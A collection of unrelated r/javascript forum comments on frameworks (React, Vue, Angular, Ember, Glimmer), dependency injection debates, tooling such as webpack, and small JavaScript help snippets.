In case you don't want or can't pass the IO instance to all you modules like suggested in stackoverflow you can also expose any variable to be available via imports! In your index.js you change the IO require as follows: var io = exports.io = require('socket.io')(server); Then you can require the exported instance in you different modules and it'll just work: const io = require('./index.js').io; io.on('connection', (client) =&gt; { // Client connected } This should also fit for unit testing, you can setup a mocked index.js to expose a IO mock or a real IO instance. 
Thanks! I'll check these out!
Wish granted - v0.2.1 https://atomiks.github.io/tippyjs/
In some cases (e.g. `const` vs `var`), using ES6 is better hands down. In some cases (e.g. unicode escapes `\u{61} = 1` vs `a = 1`), using ES5 is obviously better. In some cases (e.g. classes vs crockford-style classes) it depends on what you/your team is comfortable with. In some cases (e.g. arrows vs named functions, destructuring vs not destructuring), it depends on which makes the code more readable (based on your team's agreement of what constitutes "readable"). Optimize for readability, not for a standard compliance checklist.
Sweet dude! Thumbs up!
It's highly recommended that you first learn React and get experienced at using it ‚Äì some bits can be confusing to begin with (controlled vs uncontrolled components, context, etc). Note: I'm a member of the React core team.
Not only did you post two threads with two different questions, you didn't show us what you've tried so far and what didn't work about it. Why would it cross my mind that you tried for three hours if you show no evidence of that. Usually people don't try something for three hours and end up with a blank page. That's not what trying looks like. 
As some people said, it is not a simple comparison. I think coming from Ember.js it will be a lot of work, because Ember manages a lot for you. You will have to deal with state libraries like MobX or Redux, what router will be best for your use case etc. You have to take care to glue everything together. I like React and how you deal with the view, but I do not like how you have to deal with forms. It is complicated and you will find different ways. For me a Form is a BIG part of the web and it must be simple to deal with it. I would like to see some holistic emberlike React framework, that defines a glue layer and interfaces so that I can just use and replace the needed libs. If you want to learn React, do it. It is fast to learn.
regexr.com is cool, until you use regex101.com 
This only does JavaScript. Use regex101 to be able to use the same tool for PHP and python flavours.
https://github.com/robicch/jQueryGantt
That isn't really true. This is the start of breaking Ember into modular pieces that can all be used individually but also work together seamlessly. Plus you can choose to not use pieces you don't need, or even potentially replace one with something else if you want.
Hey guys, my team has been writing articles about the best libraries for some time, but so far only about Android and iOS. We are trying to share some really badass libs but also promote those not so known. We just started writing articles with JS libs. If you have some cool libs too, just write them down so we can put them in future articles!
Be advised that listicles are generally frowned-on here, but I'm going to let this one pass. If your article just basically combines the projects' `README.MD` files, like this post, then it's not a good fit for /r/javascript.
That's an *explicit* return statement, not implicit.
Hi /u/draguth, English only please.
Indeed. They're here to stay even though they're forgettable almost straight away. I comment what each does because I know on review I'll never remember. I think a cheat sheet is the only way.
Just saying that Safari had it for a while. No downvotes, man.
Try something like this: import React from 'react'; import ReactDOM from 'react-dom'; import { VictoryBar, VictoryChart, VictoryAxis, VictoryTheme, VictoryStack } from 'victory'; import $ from "jquery"; //HARDCODED JSON LIKE THIS WORKS //const data = {"Sheet1":[{"quarter":1,"earnings":1000},{"quarter":2,"earnings":1000},{"quarter":3,"earnings":1050505},{"quarter":4,"earnings":1000}]}; //const data2012 = data.Sheet1; //MORE MOCK DATA, JUST IGNORE THIS const data2013 = [ {quarter: 1, earnings: 10}, {quarter: 2, earnings: 120}, {quarter: 3, earnings: 100}, {quarter: 4, earnings: 1000} ]; const data2014 = [ {quarter: 1, earnings: 11500}, {quarter: 2, earnings: 13250}, {quarter: 3, earnings: 20000}, {quarter: 4, earnings: 15500} ]; const data2015 = [ {quarter: 1, earnings: 18000}, {quarter: 2, earnings: 13250}, {quarter: 3, earnings: 15000}, {quarter: 4, earnings: 12000} ]; class Main extends React.Component { constructor(props){ super(props); this.state = { data2012: [] }; } componentDidMount() { const $this = this; $.getJSON('https://script.google.com/macros/s/AKfycbygukdW3tt8sCPcFDlkMnMuNu9bH5fpt7bKV50p2bM/exec?id=1r4Wqj-gZrTFK5s-z35z7pgZ_d1T1NRaHrEuh_qXHEyw&amp;sheet=Sheet1', function(data) { $this.setState({ data2012: data.Sheet1}) }); } render() { return ( &lt;div&gt; &lt;h1&gt;Victory Tutorial&lt;/h1&gt; &lt;VictoryChart domainPadding={10} theme={VictoryTheme.material} &gt; &lt;VictoryAxis tickValues={["Quarter 1", "Quarter 2", "Quarter 3", "Quarter 4"]} /&gt; &lt;VictoryAxis dependentAxis tickFormat={(x) =&gt; (`$${x / 1000}k`)} /&gt; &lt;VictoryStack colorScale={"warm"} &gt; &lt;VictoryBar data={data2012} x={"quarter"} y={"earnings"} /&gt; &lt;VictoryBar data={data2013} x={"quarter"} y={"earnings"} /&gt; &lt;VictoryBar data={data2014} x={"quarter"} y={"earnings"} /&gt; &lt;VictoryBar data={data2015} x={"quarter"} y={"earnings"} /&gt; &lt;/VictoryStack&gt; &lt;/VictoryChart&gt; &lt;/div&gt; ); } } const app = document.getElementById('app'); ReactDOM.render(&lt;Main /&gt;, app);
Who's being sarcastic? What if I want to bookmark this site without using it's name? Won't somebody think of the bookmark?
I feel your pain... I'm a fan of Ember, but Ember Data is my least favorite part of it and it causes me most of my headaches... The fact that there is no mention of it makes me either think A) They don't see anything wrong with it (which sucks). or B) They don't plan on Ember-Data being a strong part of the future of Ember (which is... interesting... if not cool).
Glimmer's VM based rendering library appears to be better than Virtual Dom based libraries. Those libraries may need to follow Glimmer's path to stay in the competition.
We use Algolia and they have a free tier for up to 10k records. With their search helpers you can turn any text input into an autocomplete drop down that instantly searches your records. The only thing is you have to supply the records, but it's pretty easy to sync and they have SDKs for most popular frameworks and vanilla JS Check it out: https://www.algolia.com/
has a nice demo.... http://sprocketleagueus.lance.gg
No flashing required for the other method either, just one line in browser console.
You should feel awful. You don't deserve to pass if you aren't willing to do the work.
For anyone looking to do this now, in VSCode 1.11.0, there is a new setting "workbench.experimental.colorCustomizations" that you can use to overwrite the theme's colors.
Poll of 44 votes, lol.
yo, lovely ssl you got there. how about you auto-redirect to it?
I find their way of handling building the Dom with opt codes incredibly interesting. I just wish I could figure out how they do it. I've tried reading some of their explanations but it hasn't quite clicked with me.
u/tomdale wrote in a bit more detail in the HN thread: https://news.ycombinator.com/item?id=14050625
As a Scala programmer, I think that's pretty accurate. C# is busy catching up too.
what he said, I just don't like the default state management. This is the part /u/adyda is meaning fyi componentDidMount() { const $this = this; $.getJSON('https://script.google.com/macros/s/AKfycbygukdW3tt8sCPcFDlkMnMuNu9bH5fpt7bKV50p2bM/exec?id=1r4Wqj-gZrTFK5s-z35z7pgZ_d1T1NRaHrEuh_qXHEyw&amp;sheet=Sheet1', function(data) { $this.setState({ data2012: data.Sheet1}) }); }
I had not seen some of these. Thanks!
Not surprising, but I was interested to see some data.
`npm shrinkwrap` is your friend. https://docs.npmjs.com/cli/shrinkwrap
Yeah, that's supposed to be super useful. We have since switched to yarn which solved our problems :)
hey @Whybthr, come join us on [Patchwork](https://github.com/ssbc/patchwork) and see for yourself. :D or there's many [other applications](https://www.scuttlebutt.nz/applications.html), for example we've implemented `git` and GitHub interfaces on top of Scuttlebutt and dogfood our primary development through these systems.
It's a fun social network, but beyond the stuff mentioned in the article (unblockable, partition tolerant, etc) the future implications of the technology are the most exciting part. Stuff like accounting needs a generic, highly durable ledger to prove what has been done, when, and by whom. Dom wants to have an "idempotent terminal", which allows stuff like bash commands to be run while the server is offline/inaccessable. For sailing you could connect it to something like [outernet](https://outernet.is/) or [winmor](https://en.wikipedia.org/wiki/Winmor) and automatically share and download data (weather, chat, etc) with other uses over VHF radio. Same goes for hopping on an airline flight and continuing to work without interruption. 
I love the sailing implications. Would be great to not have to have a satellite connection everywhere you go.
Ok, lets try again then! I moved the Add / Remove buttons to be inside the element above them, and I also gave them both attributes of type="button" so they wouldn't cause the page to reload. By default, buttons have a type of submit, so you need to set your generic buttons to have a type="button". https://jsfiddle.net/1xq21w5z/
Has anyone noticed an influx of.. odd? yeah, odd articles that receive a fair amount of upvotes with no comments?
Just checked above jsfiddle and it looks great. Thanks man. Just wanted to ask if there is any way to keep the buttons outside the fields elements as in original design and still work the same.
Define "optimize". Why don't you want to use Node?
Yes, it would just take more steps because instead of getting one selector and copying all the html inside of it, you would have to select for multiple sibling elements. The .prev() and .next() methods will help you select the proper sibling elements. So something like this... function clone(){ var btnWrapperClone = $(this).closest('.button-wrapper').clone(); var formWrapperClone = $(this).closest('.button-wrapper').prev().clone(); // now just append them both where you need them }
Gotcha thanks. I guess that makes sense in this context. I will check out the talk.
 ¬Ø\_(„ÉÑ)_/¬Ø
¬Ø\\\_(„ÉÑ)\_/¬Ø
You could do this quite easily in sperical coordinates... Fix the radius and randomise two angles, then convert to rectangular coordinates. Not necessarily the most efficient way though...
It's like creating a little mini-scope in which you can keep state. Early on they were used primarily to create private variables and store "class instance-like" data. Lots of other uses though. 
Why ask the world when you can look it up? https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const
&gt;If I had more time, I would rather setup Archlinux Arm. ... this guy.
It's articles and conversations like this that make me close these threads want to walk blindly into traffic. I'd like to call myself "JS knowledgeable" but stuff like this just proves otherwise.
This is simply awesome
It's actually supported, there's a bug on the top side tho
You might try /r/learnjavascript. You're also missing the opening bracket on the br tag.
Don't use `document.write` -- any website that references it should be totally ignored. It really really is *bad* and does horrible things. Learn to use DOM manipulation or use `innerHTML` if you must. First big problem is that you don't have a `&lt;BR&gt;` in your code. document.write("br /&gt; " + myValues[i]); Here is a working example: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Arrays&lt;/title&gt; &lt;script type="text/javascript"&gt; /* var candidates = []; candidates[0] = "Jack Eichel"; candidates[1] = "Noah Hanifin"; candidates[2] = "Mitchell Marner"; candidates[3] = "Dylan Strome"; alert("Buffalo selects: " + candidates[0]); var candidates = ["jack eichel", "mitch marner", "noah hanifin"]; alert("Buffalo selects: " + candidates[1]); */ function showData() { var flightDate = new Date("September 22, 2004"); var myValues = ["Oceanic", 815, flightDate]; var container = document.getElementById("value-list"); // Don't forget the `var` here for (var i in myValues) { container.innerHTML += "&lt;br&gt;" + myValues[i] } } window.addEventListener("load", showData); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;JavaScript Arrays&lt;/h1&gt; &lt;div id="value-list"&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 
Closure = callback/function + connection to the variables at the birth place: function createIncrementor(x) { // x: variable at birth place function closure() { // Connection to x remains: x++; return x; } return closure; } const inc = createIncrementor(7); console.log(inc()); // 8 console.log(inc()); // 9 
Awesome thank you!! 
obfuscation
From Node.js version 4, we can use a lot of ES6/ES2015 features in our Node.js JavaScript code. If you are not familiar with the arrow functions, I've covered how to use it and how they are different from traditional function keyword functions. If you're interested in the full playlist, you can find it here: https://www.youtube.com/playlist?list=PLcMU6J_trLufBtQFjLl7iAhKgsB-8tt0T 
&gt; What if a value must be in a given interval ? That's not a job for the type system apart from enum types. The type system leaves your side as soon as you actually *run* the code so it cannot deal with what happens at that stage. Unless you get a type system that partially embeds itself in the runtime and/or that actually basically *runs* (simulates running) the code to see what your code actually does, none of which you'll find in one of the two 3rd party Javascript type systems (limited control-flow analyses, but keyword is "limited", only some constructs are recognized). If you want checks of the values and ranges during runtime you have to add *more code*. And to those whose only idea is "why don't you use TypeScript" - the guy is aware of both, the core question has nothing to do with Flow vs. TypeScript, and none of the two "use TS" comments even tries to address the questions. For the record: http://djcordhose.github.io/flow-vs-typescript/elm-flow-typescript.html#/ &gt; I don't like the way TypeScript impacts JavaScript syntax + the dev workflow &gt; Some syntaxes are flawed (flowed ?), like for object destructuring. You will have to be more specific. Merely complaining in a vague way isn't useful.
Do I read it right that there is still a pricing model even though you host it yourself? 
No, Pricing model is ONLY if you use the hosted service. If you host it yourself, its completely free. 
Very useful info, but I think TMI for him right now
The whole point of having redux bindings is that they do sCU for you, fully automated. And normally you don't ever touch it. What it shouldn't do is constrain you by it. So you still have the option for things that aren't controlled by mere state, like if the view is out of the scroll region, then why render, etc. This is what will bring actual difference to the web once Fiber comes into gears. These microbenchmarks they test against nowadays amount to virtually nothing at all in the real world. Any random native app still blasts its web counterpart out of the water.
I used this in my latest react native project, there are some bugs but the maintainer is very good at squashing them relatively quickly 
AFAIK, automatic sCU isn't the secret sauce here (Vue claims to do it too, and so does Om, a clojurescript framework on top of React). The Bloom filter is something I've never seen before in a virtual dom engine before though.
Interesting! How do you handle the situation when you want to connect with someone across the globe, do you have to build an VPN? 
You seem to understand DI well. Can you point to a good learning example or explain what it should be used for?
Wow this could be a great alternative to Horizon.js which event thought was perfect... got unlucky along the road
you can create project Easily :)
&gt;Why do I want that? I want everything optimized by default. Leaving a component unoptimized just for the sake of granularity is not a feature IMO. There are always tradeoffs, you'll get faster updates, but will pay with render performance. Most of the time there is no need to improve update performance, what is the point to reduce 2ms to 1ms, you'll get zero frame drops without any "optimizations". Rendering on the other hand is slow, and it will be even slower because everything is "optimized" by default.
Hi /u/webprojectbuilders, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
Glimmer can decide which part of a component should be sCUed and which shouldn't be. For example, if a component is all static then it wont be sCUed at all and this means the initial render performance won't be affected as the optimization for update is skipped for that whole component. Glimmer is intelligent enough to choose the best strategy for both initial render performance and update. And I think that's the focal point in this article.
Well, since React doesn't support DI and is responsible for instancing the component classes, you can't plug it to an IoC container that does constructor injection, which is a pretty big limitation. I'd kill for proper DI support in React, something that is well supported and not hacky and React-specific like context.
What makes me hesitate about TypeScript are not types themselves, since they seem even better than Flow types. It's what's around. I have a lot of trouble to differentiate ES6 syntax and TypeScript specific syntaxes, and I don't like to mix ES6 with another superlanguage that some developpers may not master, to use a specific extension etc. But indeed I may reverse my decision, as webpack helps to transparently transpile files and to import them as if they were pure js files.
Maybe also have a look [here](https://akasha.world) :)
I am able to produce a bar graph from pre feeded data,but my data is dynamic,I am accessing my data in JSP with EL,I am not able to produce a bar graph with this dynamic data. If more info is needed i can PM you,if you are willing to help
&gt; zenged.herokuapp.com Says `There's nothing here, yet.`
I like the author's conclusion. "Overall, I'm not 100% sure I made the right choice, but I only have to live with it for two years."
Another thing to keep in mind is that Rollup is much newer compared to webpack. It might have been designed to specifically accomplish one thing but in the future they will probably add additional support to compete with webpack on other levels (similarly webpack has added features that Rollup has). Webpack has ~3 years of additional development time as well.
See [Martin Fowler on DI and IoC](https://martinfowler.com/articles/injection.html) or see [Mark Seemann](http://blog.ploeh.dk/). These guys know a ton about DI and IoC. 
How do you guys feel about React-Router? I wasn't very happy about it, but I also wasn't sure if this was because of my inexperience with it. Should I try using something else as my router instead?
What do you plan on using it for? It serves all my needs quite well, including server-side rendering. Haven't tried server-side rendering + codesplitting in v4, it's a tough challenge, but apparently some people have gotten it working without waterfalls.
How do you get the data? What about it exactly is "dynamic"? If you can show a graph from pre-feeded data already, it shouldn't be difficult to change/recreate the graph when the data changes? I am using [Chart.js](http://www.chartjs.org/). Example code for updating my chart.js chart with new data: function updateSurvey(data){ // cleaning old data surveyChart.data.datasets[0].data = []; // pushing new data for(var i = 0; i &lt; data.answers.length; i++){ var answer = data.answers[i]; surveyChart.data.datasets[0].data.push(answer.votes); } // re-init chart with the new data surveyChart.update(); }
I love technical articles about how libraries are built. This is really great! I don't follow the last part of the article though. Specifically this part: &gt; We accomplish this by (under the hood) allowing every bit of data that goes into a template to separate the process of computing its current value from the process of determining whether the value might have changed. When you say "bit of data", what exactly do you mean? I assume you mean some field that is bound to a template. Like a property on glimmer component. Using KVO this would be a compute of some kind, that triggers an event when its value changes. Perhaps you're doing something totally different, but I don't see how? Breaking it down, we have an object like: { "foo": "bar" } I think you're saying that you don't observe this object (using some kind of obj.set('foo', 'baz') convention) but rather determine that the value changed by some other means. If that is so, what is the other means?
&gt; Inversion of Control is purely the idea that when a consumer says, "Hey, I need this dependency" that they are not able to construct it themselves, rather they have to ask for the dependency. Again, this is to facilitate Dependency Inversion. You're selling DI *incredibly* short. Let's see how your idea of DI compares to using *global variables*: - An object doesn't construct its own dependencies, it "asks" for them, by name or type. Do global variables allow this? Check. - An object doesn't know how the object fulfilling its dependency is configured or implemented, it just relies on an abstraction. Do global variables allow this? Check. I have tried to explain why DI is much more powerful than global variables, but you "disagree with my reasoning". So, OK, I'm curious what is *your* reasoning then, why do you use DI instead of global variables? 
https://github.com/glimmerjs/glimmer-vm/blob/master/guides/05-validators.md
I really don't think you fully understand why Dependency Injection exists. Using static singletons based on abstractions can be a valid form of Dependency Inversion, yes. It aligns more with a Service locator, however, which is usually considered an anti-pattern. It would also be a lot of work, albeit not much more than a Service Locator. We use Dependency Injection Containers to remove a lot of the burden from us in regards to configuration. Dependency Injection and Dependency Inversion are two different things. Dependency Injection serves Dependency Inversion. Dependency Injection is a better pattern than a Service Locator because it makes dependencies explicit, hopefully resolving a lot of runtime errors. [See here](http://blog.ploeh.dk/2010/02/03/ServiceLocatorisanAnti-Pattern/) Also neither Angular2 nor Aurelia adhere to the Service Locator pattern as they ask for explicit dependencies in the constructor.
ES6 is not an industry standard? It is. You misunderstood something. Coffescript is deprecated though. Polymer 1.0 will be supported + It is trivial to port to 2.x - 1.7 allows you to create hybrid elements that work on 1.x and 2.x.
Hi /u/NamelessAmos, if you have a specific question and have already attempted to answer it, then we're more than glad to help, but we're not going to do your work/homework for you.
Thats pretty much the choice today..I started with Angular went for react at the end..and many people and companies around me as well..React seems easy and not offering much at the start..but once you open the door..whoa it hits you hard :) ..so many things to learn and to do with it
You have html code in your javascript section. The html section is above it.
You don't seem to understand why I'm asking you to tell me the difference between global variables (and locators) and injection. It's not because *I'm not aware of it*. It's because you're listing benefits which are common to all those patterns, and dismissing benefits which are you unique to injection. &gt; Dependency Injection is a better pattern than a Service Locator because it makes dependencies explicit, hopefully resolving a lot of runtime errors. This doesn't even make sense because all errors in JavaScript are "runtime errors". Even if you use a type system like TypeScript, using autowiring containers would results in **more runtime errors**, not less, compared to alternatives. &gt; See here I'm very well aware of what this article says. It's somewhat bizarre you're linking to it, but you don't understand its substance. Especially in the context of JavaScript. &gt; Also neither Angular2 nor Aurelia adhere to the Service Locator pattern as they ask for explicit dependencies in the constructor. You're falling for style over substance. Aside from syntax, tell me what's the difference between calling a locator, and putting parameters in a constructor which are **automatically mapped to equivalent locator calls**. Injection doesn't have any of this automatic resolution magic going on, and it results in a very different architectural picture as a result. But you don't seem to understand why.
TS only adds type stuff, enums, async/await, field declarations, and privacy. JSX and decorators have to be enabled explicitly. Enums make a lot of sense when there are types. Async/await is already supported by some engines. Fields and privacy will be likely added in the future.
It sounds like react is the safest choice for the indecisive since it is "smaller" than the others. Correct me if I'm wrong since I haven't used any of these.
Constructor injection is not the only sort of DI. Scope container injection is perfectly fine, and one of the advantages of something like react in the now-pass√© require.js. We are working in an environment that effectively builds tens of thousands of dynamic apps, so something like webpack is suboptimal. This is one of the few cases where being tied to require is beneficial.
They're all going to be hell to migrate from. 
I've noticed that webpack is fairly slow to start the server, and the file watcher (nodemon) takes a couple of seconds to detect a file change. If someone could help me speed that up then I'd be more open to using Webpack. I've been spoiled by gulp which has a faster server startup and file watcher.
We just upgraded to 4 and there was no breaking. Where did you get it's full of breaking changes? Actually nevermind, clearly you don't work in enterprise.
I've spend a lot of time evaluating Angular + Ionic, Vue and React. My goal is to rewrite my webapp as a SPA with complimentary mobile apps. Maximum code sharing would be nice. I'd like to add to the discussion what I learned and also add Vue for comparison. Vue felt less intimidating at first, whereas React seemed to be overly complicated. Truth is, both are actually quite similar. The problem is that every single tutorial out there tells you: "React is only the V in MVC" (and so is Vue) but then goes ahead and implements all business logic in Components. I found it incredibly hard to learn about a sane (SPA?) software architecture. Some people throw in Redux and Vuex, but they actually only manage the state of the application. This is not where business logic goes. Note: I haven't found a proper solution yet. Or let's call it this way: People dump their business logic in components and Redux and that works just fine to some degree, but they actually treat React more than the V in MVC. Just be aware. React isn't that complicated, especially if you start out with functional stateless components, i. e. Components that only have a render function, props and no internal state. This helps to think about where state and logic should go and once you implement your first React components this way, you see that there's hardly any difference between Vue and React. Vue might let you even produce code that is more ugly than what you'd have produced with stateless components in React. The beauty of React is that it forces you to think in a slightly different way. Vue seemed more accessible for a spaghetti code writer like I was (am?), but it wouldn't really challenge me in the same way like React does. Vue made me understand what reactive is all about, React helped me to think about state more clearly, especially if you want to slowly transition to functional programming. Angular is often seen as a full application framework ‚Äì and to some degree, that's true. But I suspect you'd gain a lot if you actually wrote your core application / business logic as if it wasn't part of Angular to make it more shareable. For example, if you want to go mobile with Angular, you could use Ionic, but it's not 100% compatible both ways and you must think of a way to structure your app so that certain parts (the model) is actually independent from the framework. You could treat Angular more as a View-layer thing, which simply attaches a bunch of observers to your app state, which reduces the need for many APIs Angular offers and also reduces its complexity. The OP wrote about dependency injection, which I found odd as a comparison metric. DI is a design pattern to solve a specific problem and React/Vue simply don't apply to this design pattern. The main advantage of React over Vue and Angular is: React Native. Vue doesn't have anything close to it. Weex might be there one day, but right now, the docs are very incomplete, half in Chinese and I think it lacks a lot of components React Native already has. With Angular, the logical framework to build hybrid apps would be Ionic. Ionic is nice for specific cases: When your app is read-only! This isn't about performance (it's solid on newer devices) ‚Äì it's forms and input controls. This is where Ionic shows the ugly side of the underlying Webview: Mobile Safari simply sucks for things beyond a simple input field. Want to show a picker for the date that only shows 15 minute intervals? Good luck with that. An input field that allows decimal only? Your best bet is type=tel and neglect the decimal point separator. Or use the rather un-performant and ugly DatePicker that comes with Ionic. But this is a thing where even average users notice a difference to native input controls. If your app is mostly read-only with nothing more than a button and a toggle as input controls, by all means, go with Ionic. Have a form in it? Make a minimal prototype with just this form and see for yourself how it plays out. React is *learn once, write everywhere*, because you can't really share any component-related code between React and React Native. In React, you use HTML elements, in React Native, you use native elements.
&gt; Finally use webpack just to build and package everything. Learning webpack felt like stabbing one self in the leg for 3-4 days, but once you get it, and it works... It works. 
&gt; React is learn once, write everywhere, because you can't really share any component-related code between React and React Native. In React, you use HTML elements, in React Native, you use native elements. The other way round works, you can write in React-native and then use React-native-web. That's what i would do for games and less page-oriented projects. For applications we tend to put all logic and composition into Redux, that allows us to ship the largest part of it 1:1, while components just dress up. The latter is still an effort, but then again, mobile and web are so different that it's often worth it.
Version 4 is a solid approach. It's finally declarative and components oriented, the API small enough to remember after having used it once. Egghead gives a detailed introduction: https://egghead.io/courses/add-routing-to-react-apps-using-react-router-v4
Use jquery pop over, they may also have a dialog box pluggin as well. If you want to make a custom one with js, I'm off work in 2 hours I'll help to more then. 
2 years ish
Tried above method. Didn't work. Below is the jsfiddle with above changes. https://jsfiddle.net/rc9ynLsL/ 
Er, nvm. Think [this](https://github.com/jantimon/html-webpack-plugin) is what I was looking for.
Yeah, to be honest I prefer just using npm scripts, but if the aim is to get up to date and impress with a modern portfolio I guess you gotta just take the hit haha.
There's a lot of lingo that sounds fancy but breaks down into pretty simple and common development concepts that you've probably encountered already. Just pick a framework and start using it. I think that becoming good with CSS and HMTL is harder for someone with pure back-end experience.
&gt; But jumping into JS world today is a nightmare I can understand it might be daunting, but it's considerably less difficult than 5 years ago. Everything is better.. the language, the tooling the documentation, the community. Maybe take a step back, choose a thing and just go with that for now.
I started working with WebRTC recently. (but for the purpose of proxying unicast RTSP video + audio into a browser) So far I've found the following useful: * https://hpbn.co/webrtc/ &lt;-- AMAZING, free resource * https://webrtc.org * https://codelabs.developers.google.com/codelabs/webrtc-web/#0 * https://github.com/mpromonet/webrtc-streamer * http://ninjanetic.com/how-to-get-started-with-webrtc-and-ios-without-wasting-10-hours-of-your-life/ * https://github.com/radioman/WebRtc.NET But most of these are aimed at native development. They might not help as much if you're purely on the JavaScript side. Check out MDN: https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API
Make sure you have separate configs for production and development. Your production config should prioritise bundle size while your development config should prioritise build speed. The two are usually inversely proportional. And, as LowB0b says, use webpack-dev-server. You won't need nodemon once you have hot module loading set up.
Neat little project! The concept is awesome. I haven't looked through the source code yet, but the concept has a bunch of utility.
Thanks!
Great post. The question I still have in regards to Vue is what benefits it would provide me over sticking with React. From an NG1 stance, it's clearly a step forward. From a React stance, is it still a step forward? 
well one thing is for sure, if angular 1 is working for any given use case i dont se the need to switch
I did the math. There's on average one "uhhh" every 2.23 seconds throughout the video, or 26.86 "uhhh" per minute.
Thanks. As for if Vue is better than React I think it (like most things) depends. Depends on the team, their abilities in JS, the scope of the project etc. Hell, you might not even need a JS framework. Personally, JSX turned me off big time for React. Vue felt familiar like I wasn't learning a new framework instead I was using stuff I already knew in a new more efficient way if that makes sense.
Let me wonder, which UI do you find more intuitive? 
I just wish I could peak into the mind of an Angular 2 fan while reading this article, and see how they can possibly justify and even *like* the hilarious amount of accidental complexity going on here.
What's the issue with JSX? I really didn't feel like I had to learn much new. Looked at some sample code and quickly got the gist of it.
https://en.wikipedia.org/wiki/Eating_your_own_dog_food
Thanks a lot for your comments! I will try to add those in the next weeks.
"A code"? This isn't some GameShark cheat code you type in somewhere and magic happens, or some Mega Man X level code that you punch in and gets accepted.
As a React dev looking at Vue I like that I can mount Vue onto my primary root file and continue writing my own HTML in that file, but also sprinkle in Vue components without having the write the whole thing in Vue, like you have to with React.
https://jsfiddle.net/rc9ynLsL/1/
If you'd like to learn more about React, I have plenty of resources for you. The article "A Study Plan to Cure Javascript Fatigue" ( https://medium.freecodecamp.com/a-study-plan-to-cure-javascript-fatigue-8ad3a54f2eb1 ) is a great place to start. It gives an excellent series of steps for tackling modern Javascript concepts one piece at a time: Javascript, React, ES6, and state management. On that note, definitely don't over-complicate the learning process by trying to learn many different things at once. Some people will say you should use a "boilerplate" to learn React, and they're wrong - boilerplate projects almost always come with too many pieces configured, and are confusing for beginners. Instead, the best advice is to focus on learning React itself first. Once you have a good understanding of how React works, you will better appreciate why a state management library like Redux can be useful, and you can learn about other tools later. You should start out by reading through the official React docs and tutorial at https://facebook.github.io/react/, and I'd encourage you to use the official Create-React-App tool ( https://github.com/facebookincubator/create-react-app ) for setting up projects. It creates a project with a solid build setup, with no configuration needed on your part. There's an excellent post called "Simple React Development in 2017" ( https://hackernoon.com/simple-react-development-in-2017-113bd563691f ) that gives some more specific instructions on the actual steps to follow. Past that, I keep a big list of links to high-quality tutorials and articles on React, Redux, and related topics, at https://github.com/markerikson/react-redux-links . Specifically intended to be a great starting point for anyone trying to learn the ecosystem, as well as a solid source of good info on more advanced topics. It includes links for learning core Javascript (ES5), modern Javascript (ES6+), React, and much more. I also published an "Intro to React (and Redux)" presentation at http://blog.isquaredsoftware.com/2017/02/presentation-react-redux-intro/ , which is a good overview of the basic concepts for both React and Redux. Finally, the Reactiflux chat channels on Discord are a great place to hang out, ask questions, and learn. The invite link is at https://www.reactiflux.com .
My advice would be to do some investigative work and implement something simple in multiple ways to figure out which one you like. So you might implement a simple todo app, or a simple app to display the weather using an already existing api, or use the reddit api and recreate the front page. Whatever you choose just choose something small enough to finish but big enough to give you a feel for each framework you decide to investigate. And use the path of least resistance for each environment. Angular and ember both have a cli to get you up and running quickly. I'm sure there are similar tools for react, vue, etc. Use those so you can focus on the js framework and libraries and not on learning webpack / gulp / babel / etc. Those tools are also important and useful but the ones you will end up using will be heavily influenced by what javascript framework you choose.
cool, thank you
If you just want to get up and running use one of the many out of the box repos, yeoman scaffolds or build scripts. If you really want to understand it roll your own. Also webpack 2 is far more intuitive than webpack 1.
Hi! I work on a React app every day and have built my own applications with Vue, so I feel qualified to answer this. Vue is simpler. React can make it very difficult to write your application properly. Between managing component defenders and component state it becomes a huge pain when you have a lot of dynamic components at once. Vue on the other hand keeps things dead simple by extracting (and optimizing) the logic for both of these issues. Vue is easier to read. Possibly subjective, but when you have very large orchestration components you wish you'd drawn a more clear line between the JavaScript and jsx. Vue's single file components are a god send compared to what happens in react component files. Not to mention styles are now more integrated with the component with is another win. Vue is faster. Or at least from my experience it has been. Preact can match or beat out Vue in some smaller instances, but Vue still seems to have the better performance average. Turn around is (arguably) much faster with Vue. For me, I can write an app using Vue in no time and have it be exactly what I wanted with minimal bloat. For React, it's take longer and would likely be more difficult to maintain for me. A fair amount of this is opinion as I prefer Vue over React (even though I use the latter every day) so take what you will from it.
MDN actually has a tutorial for a brick breaker game: https://developer.mozilla.org/en-US/docs/Games/Tutorials/2D_Breakout_game_pure_JavaScript
Homework simulator 2017? 
lmao... Embarrassing. Our app is called genzed.herokuapp.com
The mappings are only automatic if you don't override them. That is how angular generally works. If you want to seamlessly override a particular DI'd object to a particular component you do so by specifying which object you want to inject instead of the one the component thinks it is asking for. But if you don't do any overriding that is when the automatic wiring up of dependencies happens. This is pretty basic DI stuff and how pretty much all of them work. The whole point of it is to enable inversion of control as mentioned. Just because it's possible to abuse the system and inject global state objects everywhere doesn't invalidate the idea it just means you need a better class of developer who doesn't abuse the pattern. That statement holds true for basically any design pattern not just DI. 
Let me ask you a simple question then. Let's say we have a wizard class developer, so that we can get that "your developers aren't good enough" straw man argument out. We have 90 components, and some very basic DI stuff to do: - 30 of them should see object foo1, when they ask for Foo. - 30 of them should see object foo2, when they ask for Foo. - 30 of them should not be able to ask for Foo. You can organize the project however you like, tell me how the "default automatic mapping" makes sense in this basic scenario. Or would you start overriding the DI on *every single one of them*? That means at least 60 overrides, and DRY be damned, I guess. Because that's what a real project structure looks like. If you grow it like a monolith, where the default is to resolve singletons by interface/name throughout the project, at some point you'll have a mess, even your developers are all master class hacker magicians.
There was exactly 1 breaking change in the transition from angular 2 to 4 that a recompile doesn't fix. They moved the animation stuff out of the core library where it was and into its own library. And that's it. Like he said, you don't know anything about angular. Probably because you don't use it. And that's fine. But that doesn't mean you should run around talking about it when you don't know.
Ok, I'm waiting for your example how to do it, which is not "hurr durr" though. Because what you're suggesting is, by your own admission, kinda useless as a way of doing DI.
I'm vague? I'm not the one making baseless accusations about a framework that I clearly don't use and therefore know nothing about. Either learn something about angular before talking about it so that you don't post wrong information or just don't talk about angular. Just talk about what you do know. React.
